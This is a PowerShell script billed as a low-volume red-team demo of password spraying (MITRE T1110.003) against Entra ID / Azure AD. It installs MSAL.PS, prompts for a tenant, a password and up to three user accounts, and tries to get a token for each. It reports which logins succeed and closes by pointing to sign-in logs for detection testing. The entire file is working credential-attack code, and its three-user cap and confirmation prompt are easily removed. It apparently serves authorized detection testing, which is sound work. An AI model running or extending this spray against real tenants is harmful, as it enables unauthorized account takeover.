<#
.SYNOPSIS
    T1110.003 - Password Spray (Low Volume) - Red Team TTP Demo
.DESCRIPTION
    Attempts a single password against test users in Entra ID / Azure AD.
    For authorized red team use only.
#>

# ─────────────────────────────────────────────
# STEP 1: Auto-install prerequisites
# ─────────────────────────────────────────────
Write-Host "`n[*] Checking prerequisites..." -ForegroundColor Cyan

if (-not (Get-Module -ListAvailable -Name MSAL.PS)) {
    Write-Host "[*] Installing MSAL.PS module..." -ForegroundColor Yellow
    Install-Module -Name MSAL.PS -Force -Scope CurrentUser
    Write-Host "[+] MSAL.PS installed." -ForegroundColor Green
} else {
    Write-Host "[+] MSAL.PS already installed." -ForegroundColor Green
}

Import-Module MSAL.PS -ErrorAction Stop
Write-Host "[+] MSAL.PS loaded.`n" -ForegroundColor Green

# ─────────────────────────────────────────────
# STEP 2: Interactive prompts
# ─────────────────────────────────────────────
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "   T1110.003 - Password Spray Demo Setup   " -ForegroundColor Cyan
Write-Host "============================================`n" -ForegroundColor Cyan

$TenantId = Read-Host "Enter your Tenant ID or domain (e.g. company.onmicrosoft.com)"
$Password  = Read-Host "Enter the password to spray"

Write-Host "`nEnter up to 3 test user UPNs (press Enter to skip remaining):"
$TestUsers = @()
for ($i = 1; $i -le 3; $i++) {
    $user = Read-Host "  Test User $i UPN"
    if ($user -ne "") { $TestUsers += $user }
}

if ($TestUsers.Count -eq 0) {
    Write-Host "[!] No users entered. Exiting." -ForegroundColor Red
    exit
}

# ─────────────────────────────────────────────
# STEP 3: Confirm before running
# ─────────────────────────────────────────────
Write-Host "`n[*] About to spray the following:" -ForegroundColor Cyan
Write-Host "    Tenant  : $TenantId"
Write-Host "    Password: $Password"
Write-Host "    Users   :"
$TestUsers | ForEach-Object { Write-Host "              $_" }

$confirm = Read-Host "`nProceed? (yes/no)"
if ($confirm -ne "yes") {
    Write-Host "[!] Aborted by user." -ForegroundColor Yellow
    exit
}

# ─────────────────────────────────────────────
# STEP 4: Execute password spray
# ─────────────────────────────────────────────
Write-Host "`n[*] Starting password spray...`n" -ForegroundColor Cyan

$Results = @()

foreach ($User in $TestUsers) {
    Write-Host "[*] Attempting: $User" -ForegroundColor Yellow
    try {
        $SecurePass = ConvertTo-SecureString $Password -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential($User, $SecurePass)

        $Token = Get-MsalToken `
            -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" `
            -TenantId $TenantId `
            -UserCredential $Credential `
            -ErrorAction Stop

        Write-Host "[+] SUCCESS: $User authenticated!" -ForegroundColor Green
        $Results += [PSCustomObject]@{ User=$User; Result="SUCCESS"; Error="" }
    }
    catch {
        Write-Host "[-] FAILED : $User" -ForegroundColor Red
        $Results += [PSCustomObject]@{ User=$User; Result="FAILED"; Error=$_.Exception.Message }
    }

    # Low-volume delay between attempts
    if ($User -ne $TestUsers[-1]) {
        Write-Host "[*] Sleeping 5 seconds between attempts...`n"
        Start-Sleep -Seconds 5
    }
}

# ─────────────────────────────────────────────
# STEP 5: Results summary
# ─────────────────────────────────────────────
Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "   Results Summary" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
$Results | Format-Table User, Result -AutoSize

Write-Host "[*] TTP T1110.003 complete." -ForegroundColor Cyan
Write-Host "[*] Check Entra ID Sign-In logs for failed authentication alerts.`n" -ForegroundColor Cyan